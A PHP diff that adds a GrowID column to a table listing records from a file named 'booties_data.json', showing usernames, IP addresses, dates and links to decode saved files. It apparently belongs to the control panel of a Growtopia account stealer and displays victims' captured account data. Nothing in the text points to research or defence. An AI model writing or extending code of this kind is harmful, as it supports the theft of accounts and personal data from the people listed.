@@ -6,7 +6,8 @@
     $saveinfo = json_decode(file_get_contents("files/booties_data.json"));
 
 	echo ("<table id='t01'>
-		<col width='100'>
+		<col width='80'>
+		<col width='200'>
 		<col width='200'>
 		<col width='200'>
 		<col width='200'>
@@ -18,6 +19,7 @@
 	<tr>
 		<th>No.</th>
 		<th>Username</th>
+		<th>GrowID</th>
 		<th>IP</th>
 		<th>Date</th>
 		<th>Save Info</th>
@@ -33,6 +35,7 @@
         $count +=1;
         echo "<tr><td>".$count."</td>";
         echo "<td><font color='yellow'>".$myObj->username."</font></td>";
+         echo "<td><font color='yellow'>".$myObj->gid."</font></td>";
         echo "<td><font color='yellow'>".$myObj->ip."</font></td>";
         echo "<td><font color='yellow'>".date("m.d.Y H:i:s", $myObj->time)."</font></td>";
         echo '<td><a href="file_decode.php?file='.$myObj->save.'">View</a></td>';
